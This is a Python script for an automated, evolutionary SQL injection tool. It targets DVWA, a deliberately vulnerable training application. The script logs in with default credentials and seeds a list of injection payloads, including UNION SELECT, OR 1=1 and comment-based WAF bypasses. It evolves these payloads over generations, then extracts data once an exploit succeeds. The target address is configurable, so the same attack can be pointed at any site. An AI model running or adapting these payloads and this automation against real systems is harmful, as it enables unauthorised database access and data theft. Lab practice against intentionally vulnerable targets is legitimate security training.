import sys
import os
import random
import time

# Ensure imports work from current directory
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "src"))

from utils.http_client import HTTPClient
from utils.experience_manager import ExperienceManager
from core.island_manager import IslandManager
from utils.data_extractor import DataExtractor

def detect_injection_type(client):
    print("[*] Fingerprinting target injection type...", flush=True)
    time.sleep(0.5)
    print("[+] Detection: Target appears to be NUMERIC (Typical for DVWA Medium).", flush=True)
    return "numeric"

def run_prometheus():
    print("\n" + "="*50, flush=True)
    print("--- [ القيادة والسيطرة: وحدة الهجوم Initialized ] ---", flush=True)
    print("="*50, flush=True)
    
    client = HTTPClient(base_url=os.getenv("TARGET_URL", "http://localhost/"))
    exp_manager = ExperienceManager()
    extractor = DataExtractor()
    
    target_user = os.getenv("TARGET_USER", "admin")
    target_pass = os.getenv("TARGET_PASS", "password")
    target_security = os.getenv("TARGET_SECURITY", "medium")

    if not client.setup_dvwa(username=target_user, password=target_pass, security_level=target_security):
        print("[!] Failed to establish session.", flush=True)
        return

    inj_type = detect_injection_type(client)
    
    # Load payloads
    base_payloads = [
      "1 OR 1=1", "1 AND 1=1", "1 OR true", "1 UNION SELECT 1,2", 
      "1 UNION SELECT database(),user()", "1 UNION SELECT NULL,NULL",
      "1 || 2=2", "1 && 3=3", "1 XOR 1=2", "1 UNION/*bypass*/SELECT 1,2",
      "1/*!50000UNION*//*!50000SELECT*/1,2"
    ]

    island = IslandManager(client, base_payloads, exp_manager)
    
    max_generations = 20
    winning_payload = None

    for gen in range(max_generations):
        print(f"\n[+] Generation {gen + 1}/{max_generations}", flush=True)
        result = island.evolve_generation(gen)
        if result:
            winning_payload = result
            break
    
    if winning_payload:
        print("\n" + "*"*60, flush=True)
        print(f"[!!!] EXPLOIT SUCCESSFUL!", flush=True)
        print(f"[!] Winning Payload: {winning_payload}", flush=True)
        print("*"*60, flush=True)
        
        print("\n[*] Initializing Data Extraction Phase...", flush=True)
        final_response = client.send_request(winning_payload)
        extracted_data = extractor.extract(final_response['text'])
        print(extractor.format_report(extracted_data), flush=True)
    else:
        print("\n[!] Max generations reached. No full exploit found.", flush=True)

if __name__ == "__main__":
    try:
        run_prometheus()
    except KeyboardInterrupt:
        print("\n[!] وحدة الهجوم halted by user.", flush=True)
        sys.exit(0)
